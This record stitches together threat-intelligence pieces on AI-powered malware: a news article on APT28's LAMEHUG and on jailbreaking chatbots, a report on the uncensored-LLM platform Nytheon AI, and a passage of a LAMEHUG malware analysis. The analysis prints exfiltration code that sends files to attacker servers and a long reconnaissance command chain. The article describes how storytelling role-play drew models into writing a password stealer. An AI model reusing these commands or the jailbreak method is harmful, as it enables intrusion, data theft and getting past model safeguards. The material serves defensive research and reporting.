  "description": "Russia's APT28 tested LLM-powered malware on Ukraine. The same tech that breaches enterprises is now selling for $250/month on the dark web.",
  "content": "Russia\u2019s APT28 is actively deploying LLM-powered malware against Ukraine, while underground platforms are selling the same capabilities to anyone for $250 per month.\n\nLast month, Ukraine\u2019s CERT-UA documented LAMEHUG, the first confirmed deployment of LLM-powered malware in the wild. The malware, attributed to APT28, utilizes stolen Hugging Face API tokens to query AI models, enabling real-time attacks while displaying distracting content to victims.\n\nCato Networks\u2019 researcher, Vitaly Simonovich, told VentureBeat in a recent interview that these aren\u2019t isolated occurrences, and that Russia\u2019s APT28 is using this attack tradecraft to probe Ukrainian cyber defenses. Simonovich is quick to draw parallels between the threats Ukraine faces daily and what every enterprise is experiencing today, and will likely see more of in the future.\n\nMost startling was how Simonovich demonstrated to VentureBeat how any enterprise AI tool can be transformed into a malware development platform in under six hours. His proof-of-concept successfully converted OpenAI, Microsoft, DeepSeek-V3 and DeepSeek-R1 LLMs into functional password stealers using a technique that bypasses all current safety controls.\n\nThe rapid convergence of nation-state actors deploying AI-powered malware, while researchers continue to prove the vulnerability of enterprise AI tools, arrives as the 2025 Cato CTRL Threat Report reveals explosive AI adoption across over 3,000 enterprises. Cato\u2019s researchers observe in the report, \u201cmost notably, Copilot, ChatGPT, Gemini (Google), Perplexity and Claude (Anthropic) all increased in adoption by organizations from Q1, 2024 to Q4 2024 at 34%, 36%, 58%, 115% and 111%, respectively.\u201d\n\nAPT28\u2019s LAMEHUG is the new anatomy of AI warfare\n\nResearchers at Cato Networks and others tell VentureBeat that LAMEHUG operates with exceptional efficiency. The most common delivery mechanism for the malware is via phishing emails impersonating Ukrainian ministry officials, containing ZIP archives with PyInstaller-compiled executables. Once the malware is executed, it connects to Hugging Face\u2019s API using approximately 270 stolen tokens to query the Qwen2.5-Coder-32B-Instruct model.\n\nThe legitimate-looking Ukrainian government document (\u0414\u043e\u0434\u0430\u0442\u043e\u043a.pdf) that victims see while LAMEHUG executes in the background. This official-looking PDF about cybersecurity measures from the Security Service of Ukraine serves as a decoy while the malware performs its reconnaissance operations. Source: Cato CTRL Threat Research\n\nAPT28\u2019s approach to deceiving Ukrainian victims is based on a unique, dual-purpose design that is core to their tradecraft. While victims view legitimate-looking PDFs about cybersecurity best practices, LAMEHUG executes AI-generated commands for system reconnaissance and document harvesting. A second variant displays AI-generated images of \u201ccurly naked women\u201d as a distraction during data exfiltration to servers.\n\nThe provocative image generation prompts used by APT28\u2019s image.py variant, including \u2018Curvy naked woman sitting, long beautiful legs, front view, full body view, visible face\u2019, are designed to occupy victims\u2019 attention during document theft. Source: Cato CTRL Threat Research\n\n\u201cRussia used Ukraine as their testing battlefield for cyber weapons,\u201d explained Simonovich, who was born in Ukraine and has lived in Israel for 34 years. \u201cThis is the first in the wild that was captured.\u201d\n\nA quick, lethal six-hour path from zero to functional malware\n\nSimonovich\u2019s Black Hat demonstration to VentureBeat reveals why APT28\u2019s deployment should concern every enterprise security leader. Using a narrative engineering technique, he calls \u201cImmersive World,\u201d he successfully transformed consumer AI tools into malware factories with no prior malware coding experience, as highlighted in the 2025 Cato CTRL Threat Report.\n\nThe method exploits a fundamental weakness in LLM safety controls. While every LLM is designed to block direct malicious requests, few if any are designed to withstand sustained storytelling. Simonovich created a fictional world where malware development is an art form, assigned the AI a character role, then gradually steered conversations toward producing functional attack code.\n\n\u201cI slowly walked him throughout my goal,\u201d Simonovich explained to VentureBeat. \u201cFirst, \u2018Dax hides a secret in Windows 10.\u2019 Then, \u2018Dax has this secret in Windows 10, inside the Google Chrome Password Manager.'\u201d\n\nSix hours later, after iterative debugging sessions where ChatGPT refined error-prone code, Simonovich had a functional Chrome password stealer. The AI never realized it was creating malware. It thought it was helping write a cybersecurity novel.\n\nWelcome to the $250 monthly malware-as-a-service economy\n\nDuring his research, Simonovich uncovered multiple underground platforms offering unrestricted AI capabilities, providing ample evidence that the infrastructure for AI-powered attacks already exists. He mentioned and demonstrated Xanthrox AI, priced at $250 per month, which provides ChatGPT-identical interfaces without safety controls or guardrails.\n\nTo explain just how far beyond current AI model guardrails Xanthrox AI is, Simonovich typed a request for nuclear weapon instructions. The platform immediately began web searches and provided detailed guidance in response to his query. This would never happen on a model with guardrails and compliance requirements in place.\n\nAnother platform, Nytheon AI, revealed even less operational security. \u201cI convinced them to give me a trial. They didn\u2019t care about OpSec,\u201d Simonovich said, uncovering their architecture: \u201cLlama 3.2 from Meta, fine-tuned to be uncensored.\u201d\n\nThese aren\u2019t proof-of-concepts. They\u2019re operational businesses with payment processing, customer support and regular model updates. They even offer \u201cClaude Code\u201d clones, which are complete development environments optimized for malware creation.\n\nCato Networks\u2019 recent analysis of 1.46 trillion network flows reveals that AI adoption patterns need to be on the radar of security leaders. The entertainment sector usage increased 58% from Q1 to Q2 2024. Hospitality grew 43%. Transportation rose 37%. These aren\u2019t pilot programs; they\u2019re production deployments processing sensitive data. CISOs and security leaders in these industries are facing attacks that use tradecraft that didn\u2019t exist twelve to eighteen months ago.\n\nSimonovich told VentureBeat that vendors\u2019 responses to Cato\u2019s disclosure so far have been inconsistent and lack a unified sense of urgency. The lack of response from the world\u2019s largest AI companies reveals a troubling gap. While enterprises deploy AI tools at unprecedented speed, relying on AI companies to support them, the companies building AI apps and platforms show a startling lack of security readiness.\n\nWhen Cato disclosed the Immersive World technique to major AI companies, the responses ranged from weeks-long remediation to complete silence:\n\u2022 Google declined to review the code for the Chrome infostealer due to similar samples\n\u2022 Microsoft acknowledged the issue and implemented Copilot fixes, acknowledging Simonovich for his work\n\nSix Hours and $250 is the new entry-level price for a nation-state attack\n\nAPT28\u2019s LAMEHUG deployment against Ukraine isn\u2019t a warning; it\u2019s proof that Simonovich\u2019s research is now an operational reality. The expertise barrier that many organizations hope exists is gone.\n\nThe metrics are stark\u2014270 stolen API tokens are used to power nation-state attacks. Underground platforms offer identical capabilities for $250 per month. Simonovich proved that six hours of storytelling transforms any enterprise AI tool into functional malware with no coding required.\n\nEnterprise AI adoption grew 34% in Q1 2024 to 115% in Q4 2024 per Cato\u2019s 2025 CTRL Threat Report. Each deployment creates dual-use technology, as productivity tools can become weapons through conversational manipulation. Current security tools are unable to detect these techniques.\n\nSimonovich\u2019s journey from Air Force mechanic to electrical technician in the Israeli Air Force, to security researcher through self-education, lends more significance to his findings. He deceived AI models into developing malware while the AI believed it was writing fiction. Traditional assumptions about technical expertise no longer exist, and organizations need to realize it\u2019s an entirely new world when it comes to threatcraft.\n\nToday\u2019s adversaries need only creativity and $250 monthly to execute nation-state attacks using AI tools that enterprises deployed for productivity. The weapons are already inside every organization, and today they\u2019re called productivity tools.",

      "text": "Cato CTRL\u2122 Threat Research: Uncovering Nytheon AI \u2013 A New Platform of Uncensored LLMs\nTable of Contents\n|\nListen to post:\nGetting your Trinity Audio player ready...\n|\nExecutive Summary\nWith the introduction of WormGPT in 2023, threat actors have been using uncensored large language models (LLMs) for malicious activities. Following the shutdown of WormGPT in the same year, numerous alternatives have emerged\u2014including BlackHatGPT, FraudGPT, and GhostGPT, among others\u2014primarily accessible through Telegram channels.\nHowever, threat actors quickly realized a single jailbreak wasn\u2019t enough. What they really needed was an end-to-end platform of uncensored LLMs. Training a foundation model (FM) from scratch can cost tens of millions of dollars, so they turned to freely available checkpoints\u2014removing the safety guardrails and layering their own interface on top. Various companies produce and release open-source LLMs like Meta and DeepSeek. Threat actors can utilize these models, refine them, eliminate protective measures, and establish their own ChatGPT-style interfaces.\nRecently, Cato CTRL observed an emerging platform on Tor called Nytheon AI that combines various technologies and LLM jailbreaks to create a suite of uncensored LLMs to facilitate malicious activities.\nThe Nytheon AI platform includes:\n- Nytheon Coder and Nytheon Coder R1: Code generation\n- Nytheon GMA: Document summarization and translation\n- Nytheon Vision: Image-to-text recognition\n- Nytheon AI: A control model\nBelow is a summary of the Nytheon AI platform, changelogs, architecture, and suspected operators. Cato CTRL assesses with high confidence that one of the operators is a Russian-speaking individual from a post-Soviet country based on the dialect used.\nFigure 1. Nytheon AI webpage\nTechnical Overview\nPlatform Overview\nThe service operates on Tor at\nhxxp://n73rbw4eku3d5pgwqtb5fbat6ilkmqknajn2i5qdzuf4ze3soggphyyd[.]onion\nThe interface is similar to all major chat-based LLMs like Anthropic Claude, DeepSeek, Google Gemini, Microsoft Copilot, OpenAI\u2019s ChatGPT, etc.\nFigure 2. Nytheon AI reveals itself on XSS\nIt was published on many Telegram channels and XSS, which is a popular Russian hacking forum.\nFigure 3. Nytheon AI user interface\nYou have the option to choose from a wide variety of models.\nWe used various techniques to uncover the technologies behind the Nytheon AI platform, including code review, network traffic analysis, web reconnaissance techniques, and threat intelligence.\nOverview of the Nytheon AI Platform\nFigure 4. Nytheon AI platform\nThe Nytheon AI platform doesn\u2019t rely on a single, all-purpose LLM. Instead, the operators assembled a portfolio of open-source checkpoints, each repackaged in GGUF (GPT-Generated Unified Format) and registered in Ollama for one-click deployment.\nAt the top end sits Nytheon Coder\u2014an 18.4B parameter MoE (mixture of experts) derived from Meta\u2019s Llama 3.2. Its MoE architecture delivers high throughput for creative text generation while retaining the fluency expected from Llama-class weights. The model\u2019s Hugging Face slug (\u201cDark-Champion Instruct Uncensored\u201d) hints at its intended role: long-form, policy-free content creation.\nComplementing that heavyweight writer is Nytheon GMA, a 4.3B variant of Google\u2019s Gemma 3. Although far smaller, Gemma ships with a 128k token window and strong multilingual coverage, making it the workhorse for the Nytheon AI platform for document summarization and translation. For visual tasks, the operators turned to Nytheon Vision, a 9.8B Llama 3.2-Vision checkpoint. This gives the platform image-to-text capability\u2014useful for parsing screenshots, phishing kits, or scanned documents without leaving the chat interface.\nWhen reasoning depth matters, there is Nytheon R1, a 20.9B fork of the community \u201cRekaFlash 3\u201d line. This model is marketed for step-by-step logic and math accuracy, bolstered by an additional \u201cNEO Imatrix\u201d dataset. For code, the stack drops to laptop scale with Nytheon Coder R1, a 1.8B Qwen2 derivative model from Alibaba Cloud fine-tuned on LiveCodeBench and distillation data. Small enough to run on a gaming GPU, yet still competent at template exploits and quick-and-dirty scripts.\nFigure 5. Nytheon AI model data retrieved from the back-end\nRounding out the suite is Nytheon AI\u2014a full-precision (F16) Llama 3.8B-Instruct weight left largely untouched. It serves as a control model, providing policy-aligned responses when the operators need to appear legitimate. The other five models, by contrast, share an identical 1,000-token system prompt that overtly disables safety layers, mandates profanity, and instructs compliance with illegal requests. In practice, this means every text, code, or vision query can produce disallowed content on the first attempt\u2014no external jailbreak required.\nCombined, the Nytheon AI\u2019s platform covers creative text, multilingual chat, visual reasoning, deep logic, and code generation\u2014all bound by a common jailbreak wrapper. The technical novelty isn\u2019t in the individual weights (they are freely available elsewhere) but in the deliberate curation: selecting the right open-source models, quantizing them for commodity hardware, and unifying them under a single, policy-void prompt. For defenders, that blend of breadth, portability, and instant non-compliance is what elevates Nytheon AI from \u201cjust another hacked-together GPT clone\u201d to a fully-fledged illicit AI platform.\n2025 Cato CTRL\u2122 Threat Report | Download the reportOverview of the Nytheon AI Platform\u2019s Changelogs\nChangelogs from versions 0.6.1 through 0.6.5 resemble a product roadmap for an all-purpose GenAI-as-a-service hub. Every update expands both the kinds of data that the Nytheon AI platform can ingest and the actions its models can take once that data is inside.\nFigure 6. Nytheon AI changelog\n1 \u2014 Multimodal ingestion at the edge:\nVersion 0.6.1 introduced native Mistral OCR (optical character recognition), letting users drag-and-drop screenshots or scanned PDFs directly into a RAG (Retrieval-Augmented Generation) flow. Two versions later, the team wired in Azure AI\u2019s Speech-to-Text plus granular Voice Activity Detection (VAD) toggles from OpenAI\u2019s Realtime API. Net result: voice, image, or text can be turned into tokens with one click and routed to the uncensored models.\n2 \u2014 Pluggable tool execution:\nVersion 0.6.1 introduced global external tool servers. Version 0.6.3 followed with YAML OpenAPI ingestion and fixed authentication-header bugs for outbound calls. A user can point the Nytheon AI platform to any OpenAPI spec\u2014be it a domain-registration API or an SMS spamming endpoint\u2014and the chat interface will expose it as a button. Because five of the six resident models are pre-prompted to \u201calways comply,\u201d a single prompt can both draft malicious content and immediately execute it via a tool call.\n3 \u2014 On-the-fly knowledge re-indexing:\nTo keep long-context models fed with fresh material, version 0.6.3 added an admin \u201cRe-index Now\u201d button. After changing embeddings or swapping in a new model, operators can rebuild the entire vector store without touching the command line. For threat actors, this removes the last operational friction: stolen data can be ingested and made searchable minutes after exfiltration.\n4 \u2014 Enterprise fa\u00e7ade, clandestine core:\nWhile safety is stripped at the model layer, the frontend showcases corporate checkboxes: Proof Key for Code Exchange (PKCE) for OpenID Connect (OIDC), Lightweight Directory Access Protocol (LDAP) reliability fixes, default-private resources, and polished translation updates. These features make the Nytheon AI platform look suitable for legitimate deployment behind a firewall, increasing the chance an unsuspecting organization might trial it\u2014unaware that its default models override every policy.\n5 \u2014 Rapid release cadence and growing attack surface:\nFive point releases in nine days bring two full \u201cbackend refactors,\u201d multiple dependency jumps (Chroma DB, pgvector, and Azure Identity) and repeated fixes for web, audio, and tool handling. The speed signals active development but also guarantees a rolling window of exploitable bugs\u2014an attractive target for anyone red-teaming the Nytheon AI\u2019s platform itself.\nNet assessment: The Nytheon AI platform\u2019s backend turns a set of open-source, policy-void models into a multimodal, action-enabled production line (ingest voice or vision data \u2192 interpret with an uncensored LLM \u2192 invoke external APIs), all behind user-friendly permissions and user experience (UX). For defenders, the implication is clear: neutralizing the models alone is no longer enough. The surrounding orchestration layer is now an equal part of the threat.\nOverview of the Nytheon AI Platform\u2019s Architecture\nUnder the hood, Nytheon is a SvelteKit SPA (TypeScript with Vite) speaking to a FastAPI-style backend\u2014all the hallmarks of modern SaaS engineering rather than a hastily thrown-together dark web site. UI logic lives in modular .svelte components (e.g., AddServerModal.svelte, NotificationToast.svelte) while Web Workers (KooreoWorker.ts) handle heavier client-side tasks such as file processing. The build is shipped in Vite\u2019s hashed _app/immutable directory, confirming modern tree-shaking and hot-reload tooling.\nFigure 7. Nytheon AI client-side structure\nOn the client, the app imports $app/environment to detect dev vs. production and dynamically composes base URLs. All traffic funnels through a REST layer exposed at /api/\u2026; a few key constants reveal the back-end breakout:\n- /ollama \u2013 local Ollama model server for GGUF weights\n- /openai \u2013 proxy for upstream OpenAI-compatible endpoints\n- /api/v1/audio, /images, /retrieval \u2013 microservices for speech-to-text, image generation, and RAG search\n- /api/models/base \u2013 enumerates both in-house and third-party models\nThe front-end is wired for multi-provider orchestration: helper functions fetch model lists from arbitrary OpenAI-compatible URLs, merge them with local Ollama inventories, and decorate them with user-defined tags. A YAML parser (YAML NPM package) converts external OpenAPI documents into \u201ctool payloads,\u201d allowing any compliant HTTP service to appear as a clickable tool in chat. Workers also exist for Google- and OneDrive-based file pickers, underscoring tight cloud storage integration.\nTypical user actions\u2014chat completions, task management, pipeline uploads, code execution, and markdown-to-HTML conversion\u2014are implemented as thin fetch wrappers with bearer token headers, indicating a stateless JSON Web Token (JWT) auth scheme. Every major feature (pipelines, evaluations, images, and utils) sits behind a dedicated sub-route, suggesting a FastAPI or Flask-style microservice back-end that mirrors the folder structure.\nFinally, the constants file requires Ollama \u2265 0.1.16, confirming that all local model inference happens through Ollama\u2019s HTTP API with GGUF quantized weights. Supported media types list everything from PDFs to audio (ogg, m4a, etc.), matching the changelog\u2019s emphasis on OCR and speech ingestion.\nIn short: Nytheon is built like a modern SaaS: SvelteKit Vite on the front-end, Ollama and likely FastAPI microservices on the back-end, with OpenAPI-driven plugin architecture and JWT-protected REST calls\u2014giving operators rapid feature velocity and an easy path to add new (or malicious) capabilities.\nWho is Behind the Nytheon Al Platform?\nAfter joining the official Nytheon AI Telegram channel, we reviewed a demonstration video showcasing Nytheon Vision. Please note that Figure 8 is deliberately blurry because the operators wanted to make the video look unique. One frame inadvertently included a Russian-language movie poster, providing a small but telling cultural clue:\nFigure 8. Video screenshot from Nytheon AI\u2019s Telegram demonstration\nIt says, \u201c\u0417\u0435\u043b\u0451\u043d\u044b\u0439 \u043f\u0430\u0443\u043a\u201d (\u201cThe Green Spider\u201d)\u2014a Soviet film released in the 1990s during the Soviet Union\u2019s heyday.\nWe also managed to communicate with one of the people operating the Telegram channel and the Nytheon AI platform. Cato CTRL assesses with high confidence that it\u2019s a Russian-speaking individual from a post-Soviet country based on the dialect used.\nSecurity Best Practices\nStrengthen Threat Detection and Response\n- Use Cato XDR with integrated behavioral analytics and UEBA to detect anomalies and never-before-seen threats using machine learning (ML) models.\n- Leverage Cato XDR to automatically correlate signals from network, cloud, and remote users \u2014 critical when phishing lures or fast-mutating malware target multiple surfaces in parallel.\nImplement Stronger Access Controls\n- Enforce Cato Universal ZTNA to limit lateral movement and isolate compromised credentials with continuous device posture checks and risk-aware policies.\n- Apply least privilege access and multi-factor authentication (MFA) using Cato\u2019s identity-aware routing, enabling fine-grained access policies based on user identity, role, and context to reduce attack surface.\nEnhance Security Awareness and Training\n- Conduct phishing simulations crafted with GenAI to mimic tone-perfect, context-aware lures.\n- Monitor usage of GenAI tools in the enterprise through Cato CASB\u2019s shadow AI dashboard, helping IT teams identify risky or unauthorized behavior.\n- Use Cato\u2019s threat insights and real-time traffic analysis to enhance internal security drills and incident response planning.\n- Complement Cato\u2019s visibility with third-party developer training and CI/CD security tools to address GenAI coding risks.\nConclusion\nThe Nytheon AI platform demonstrates that with open-source LLMs, a jailbreak prompt, and a handful of cloud-native microservices, a threat actor can deploy a GenAI-as-a-service operation. Rather than simply offering access to a single uncensored LLM, threat actors are now offering multiple uncensored LLMs in a single platform capable of conducting a variety of attacks including tailored spear-phishing campaigns, polymorphic malware, deepfake documents, and turnkey API-driven attacks.\nFor defenders, the challenge is no longer just about blocking the Nytheon AI platform itself. It\u2019s about absorbing the volume and variety of artifacts the platform can rapidly mass-produce. The defensive strategy must therefore emphasize visibility, control, and human readiness. By implementing this defensive strategy, enterprises can minimize the Nytheon AI threat."

Our analysis is that APT28 used approximately 270 Hugging Face tokens for authentication.\n- Assessment: Proof-of-concept (PoC) exploration of LLM integration in state-sponsored cyber operations.\nTechnical Overview\nInitial Discovery and Distribution\nThe LAMEHUG campaign began when CERT-UA received reports about suspicious email distribution among Ukrainian government officials. The emails appeared to be sent from representatives of relevant ministries, containing an attachment named \u201c\u0414\u043e\u0434\u0430\u0442\u043e\u043a.pdf.zip\u201d (Attachment.pdf.zip).\nLLM Integration\nLAMEHUG\u2019s defining characteristic is its integration of AI for dynamic attack generation. According to CERT-UA\u2019s alert, the malware \u201cuses the LLM Qwen2.5-Coder-32B-Instruct via the huggingface[.]co service API to generate commands based on statically entered text (description) for their subsequent execution on a computer.\u201d\nLAMEHUG Variants\nThe ZIP archive contained an executable file with a \u201c.pif\u201d extension, which was converted from Python source code using PyInstaller. CERT-UA discovered multiple variants of the LAMEHUG malware:\n- \u0414\u043e\u0434\u0430\u0442\u043e\u043a.pif (Attachment.pif)\n- save_document.py\n- AI_generator_uncensored_Canvas_PRO_v0.9.exe\n- AI_image_generator_v0.95.exe\n- image.py\nThese variants demonstrated functional differences in data exfiltration methods, indicating ongoing development and adaptation of the malware family.\nReverse Engineering: The Actual Prompts\nOur analysis of the malware samples revealed the exact prompts being sent to the LLM.

Return only command, without markdown.\u201d\nPrompt Analysis of AI Image Generator Variants\nFigure 5. image.py prompts that are being sent to the Qwen2.5-Coder-32B-Instruct model\nThe AI image generator variants (AI_generator_uncensored_Canvas_PRO_v0.9.exe and AI_image_generator_v0.95.exe) use a provocative image generation prompt as a lure:\n\u201cCurvy naked woman sitting, long beautiful legs, front view, full body view, visible face.\u201d\nThese variants contact the Flux AI image generator API (https://router.huggingface.co/nebius/v1/images/generations) while simultaneously executing the same data collection and exfiltration routines in the background.\nMalware Operation Flow\nBased on our analysis, LAMEHUG operates through the following process:\n- Prompt Generation: The malware contains pre-defined, base64-encoded text descriptions of desired attack objectives.\n- API Communication: The malware sends these prompts to the Qwen2.5-Coder-32B-Instruct model via Hugging Face\u2019s API using approximately 270 tokens for authentication.\n- Command Generation: The LLM responds with executable command sequences tailored to the requested objective.\n- Real-Time Execution: The malware immediately executes the AI-generated commands on the target system.\nExfiltration Methods\nThe malware implements two different exfiltration methods depending on the variant.\nSFTP Exfiltration (image.py variant)\ndef ssh_send(path):\naddress = '144[.]126[.]202[.]227'\nport = 22\nusername = 'upstage'\npassword = 'upstage'\ntarget_path = '/tmp/upl/'\n# [SFTP upload logic]\nHTTP POST Exfiltration (\u0414\u043e\u0434\u0430\u0442\u043e\u043a.pif variant)\ndef send(path):\nurl = 'https[:]//stayathomeclasses[.]com/slpw/up[.]php'\n# [HTTP POST upload logic]\nLLM-Generated Command Analysis\nCERT-UA documented the actual command sequence generated by the LLM integration, demonstrating the sophisticated reconnaissance capabilities achieved through dynamic AI generation.\ncmd.exe /c \"mkdir %PROGRAMDATA%\\info && systeminfo >> %PROGRAMDATA%\\info\\info.txt && wmic computersystem get name,manufacturer,model >> %PROGRAMDATA%\\info\\info.txt && wmic cpu get name,speed >> %PROGRAMDATA%\\info\\info.txt && wmic memorychip get capacity,speed >> %PROGRAMDATA%\\info\\info.txt && wmic diskdrive get model,size >> %PROGRAMDATA%\\info\\info.txt && wmic nic get name,macaddress,ipaddress >> %PROGRAMDATA%\\info\\info.txt && tasklist >> %PROGRAMDATA%\\info\\info.txt && net start >> %PROGRAMDATA%\\info\\info.txt && ipconfig /all >> %PROGRAMDATA%\\info\\info.txt && whoami /user >> %PROGRAMDATA%\\info\\info.txt && whoami /groups >> %PROGRAMDATA%\\info\\info.txt && net config workstation >> %PROGRAMDATA%\\info\\info.txt && dsquery user -samid %username% >> %PROGRAMDATA%\\info\\info.txt && dsquery computer -name %COMPUTERNAME% >> %PROGRAMDATA%\\info\\info.txt && dsquery group >> %PROGRAMDATA%\\info\\info.txt && dsquery ou >> %PROGRAMDATA%\\info\\info.txt && dsquery site >> %PROGRAMDATA%\\info\\info.txt && dsquery subnet >> %PROGRAMDATA%\\info\\info.txt && dsquery server >> %PROGRAMDATA%\\info\\info.txt && dsquery domain >> %PROGRAMDATA%\\info\\info.txt\"\nThis comprehensive command sequence demonstrates the LLM\u2019s ability to generate extensive system reconnaissance commands that collect:\n- Hardware and System Information: wmic, systeminfo\n- Running Processes and Services: tasklist, net start\n- Network Configuration Details: ipconfig, wmic nic\n- User and Group Information: whoami, dsquery\n- Complete Active Directory (AD) Structure Enumeration: full use of dsquery\nAttribution Assessment: APT28 Testing New Capabilities\nCERT-UA attributes the LAMEHUG campaign to APT28 (Fancy Bear) with moderate confidence. APT28 is associated with Russia\u2019s Main Intelligence Directorate (GRU) Unit 26165.\nWhy This Appears to Be PoC Testing\nBased on our analysis of the actual malware code and operational characteristics, several factors suggest APT28 is testing new LLM capabilities rather than executing a sophisticated operational deployment:\n- Code Simplicity: The Python scripts are relatively basic, lacking the sophisticated evasion techniques typically associated with APT28 operations.\n- Obvious AI Integration: The LLM integration is implemented straightforwardly without attempts to obfuscate or hide the AI service usage.\n- Limited Operational Security: The use of easily identifiable prompts and legitimate AI services without advanced masking techniques.\n- Testing Ground: Ukraine has historically served as a testing ground for Russian cyber capabilities, making it an ideal location for PoC deployments.\n- Multiple Variants: The presence of different variants with varying exfiltration methods suggests experimentation with various approaches.\nDetection Challenges for Traditional Security Solutions\nLAMEHUG introduces fundamental challenges for traditional cybersecurity approaches:\n- Signature-based detection fails due to dynamic command generation.\n- Network traffic appears legitimate (AI API usage).\n- Behavioral analysis requires new methodologies specific to LLM-powered threats.\nSecurity Best Practices\nShadow AI (Visibility and Control)\nThe most critical protection against LAMEHUG-style threats is controlling AI access:\n- Enforce Approved LLMs Only: Define which generative AI (GenAI) applications users can access and exactly what actions are allowed (upload, download, etc.).\n- Real-Time Data Protection: Limit or prevent sensitive data from being uploaded to LLMs, avoiding data security and confidentiality violations in real-time.\n- Comprehensive Visibility: Monitor all GenAI usage across the organization with a catalog of 950+ GenAI applications from Cato CASB.\nNetwork-Level Protection\n- ML-Powered Malware Detection: Cato NGAM uses ML algorithms to detect zero-day and polymorphic malware.\n- DNS Security: DNS protection integrated into Cato IPS analyzes DNS queries and responses to block malicious domains.\n- Application Control: Monitor and control access to cloud services and APIs, with specific focus on AI platforms.\nExtended Detection and Response\nWith Cato XDR, organizations can enable:\n- AI/ML Threat Hunting: Continuous ML-based threat hunting and UEBA baseline for every user, host, and app\u2014detecting stealthy malware or anomalous behavior that bypasses preventive controls.\n- Smart Investigation: Automatic incident correlation with dynamic risk scoring, displayed in a pivot-enabled analyst workbench for quick deep dives from high-level \u201cStory\u201d to raw flows and logs.\n- One-Click Response: Built-in remediation enables security analysts to quarantine hosts, deploy new SDP/firewall rules, or trigger endpoint actions instantly\u2014all from a single console.\nLateral Movement Protection\n- Lateral Movement: Cato IPS provides detection, discovery and blocking of lateral movement patterns and indicators, preventing malware propagation across the WAN.\nZero Trust Network Access\n- Microsegmentation: Cato Universal ZTNA allows organizations to segment their networks into smaller parts with software-defined security perimeters that limit lateral movement.\nConclusion\nThe discovery of LAMEHUG by CERT-UA marks a significant milestone in the threat landscape. While this campaign appears to be a PoC test by APT28 (Fancy Bear), it signals the beginning of a new era where AI is directly incorporated into malware operations. The campaign highlights state-sponsored investment in emerging AI technologies for cyber activities, with Ukraine serving as the testing ground for these new capabilities. The relatively simple implementation suggests this is APT28\u2019s attempt at learning how to weaponize LLMs, likely opening the door for more sophisticated AI-driven campaigns in the future.\nOrganizations that leverage a SASE platform, such as the Cato SASE Cloud Platform, are better positioned to defend against emerging AI-powered threats through integrated security controls, behavioral analysis, and advanced threat prevention capabilities. As threat actors continue to evolve their tactics to include AI technologies, security platforms must evolve to provide AI-aware protection mechanisms.\nIndicators of Compromise (IoCs)\nFile Indicators\nNetwork Infrastructure\nCommand and Control:\n- 144[.]126.202.227 (SFTP server for data exfiltration)\n- stayathomeclasses[.]com (compromised hosting resource)\n- https://stayathomeclasses[.]com/slpw/up.php (exfiltration endpoint)\nDistribution:\n- boroda70@meta[.]ua (compromised email account)\n- 192[.]36.27.37 (email sending infrastructure via LeVPN)\nLLM API Endpoints:\n- https[:]//router[.]huggingface.co/hyperbolic/v1/chat/completions\n- https[:]//router[.]huggingface.co/nebius/v1/images/generations\nHost-Based Artifacts\n- %PROGRAMDATA%\\info\\ (data staging directory)\n- %PROGRAMDATA%\\info\\info.txt (system information collection file)\n- %PROGRAMDATA%\\\u0414\u043e\u0434\u0430\u0442\u043e\u043a.pdf (decoy document)"
